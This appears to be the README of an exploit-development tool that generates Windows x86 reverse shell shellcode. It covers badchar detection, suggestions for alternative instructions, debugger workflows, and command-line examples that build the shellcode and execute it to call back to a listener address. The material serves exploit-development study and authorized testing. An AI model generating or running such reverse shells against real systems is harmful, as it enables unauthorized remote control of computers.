# Windows(x86) reverse shell shellcode generator

A tool for generating Windows x86 reverse shell shellcode with badchar detection and alternative instruction suggestions.

## Features

- **Reverse Shell Generation**: Creates Windows x86 reverse shell shellcode using pure assembly
- **Badchar Detection**: Identifies bad characters in the generated shellcode
- **Color-Coded Output**: Highlights bad characters in RED for easy identification
- **Suggestions**: Provides alternative instruction sequences to avoid badchars
- **Multiple Output Formats**: Python and C format outputs
- **Keystone & Capstone**: Uses industry-standard assembly/disassembly engines

## Installation

### Prerequisites

```bash
pip install keystone-engine capstone
```

## Usage

### Basic Usage

Generate a reverse shell with default badchar (\\x00):

```bash
python3 generator.py -l 192.168.1.10 -p 4444
```

### Specify Multiple Bad Characters

```bash
python3 generator.py -l 192.168.1.10 -p 4444 -b 00 0a 0d 20 e0
```

### Show All Instructions

By default, only instructions with bad characters are shown. To see all:

```bash
python3 generator.py -l 192.168.1.10 -p 4444 -b 00 20 -a
```

### Save to Binary File

```bash
python3 generator.py -l 192.168.1.10 -p 4444 -o shellcode.bin
```

### Debug Mode (Insert int3 Breakpoint)

For debugging with WinDbg or x64dbg:

```bash
python3 generator.py -l 192.168.1.10 -p 4444 -d
```

This inserts an `int3` instruction at the very beginning of the shellcode, allowing you to:
- Attach a debugger before execution
- Set breakpoints
- Step through the shellcode instruction by instruction

### Execute Shellcode (Windows Only)

**WARNING**: Only on Windows 32-bit Python and with proper authorization!

```bash
python3 generator.py -l 192.168.1.10 -p 4444 -t
```

This will:
1. Allocate executable memory
2. Copy shellcode to memory
3. Display the memory address
4. Pause for debugger attachment (if needed)
5. Execute the shellcode in a new thread

### Combined Debug + Execution

For full debugging workflow:

```bash
python3 generator.py -l 192.168.1.10 -p 4444 -d -t
```

Workflow:
1. Script generates shellcode with int3 breakpoint
2. Script allocates memory and displays address
3. Attach WinDbg to `python.exe`
4. Press ENTER in script to execute
5. Debugger breaks at int3
6. Step through shellcode

## Example Output

When bad characters are detected, the tool provides:

1. **Visual Identification**: Bad characters highlighted in RED
2. **Bytecode Display**: Shows exact bytes with bad chars marked
3. **Alternative Instructions**: Suggests replacement code sequences

Example:

```
bash
[BAD] 00d7: 89 e0                           mov      eax, esp
      └─ Bad chars found: \xe0
      └─ Alternative instructions:
         1) Use push/pop instead of direct mov
            push esp
            pop eax
         2) Use LEA (Load Effective Address) instead of MOV
            lea eax, [esp]
```

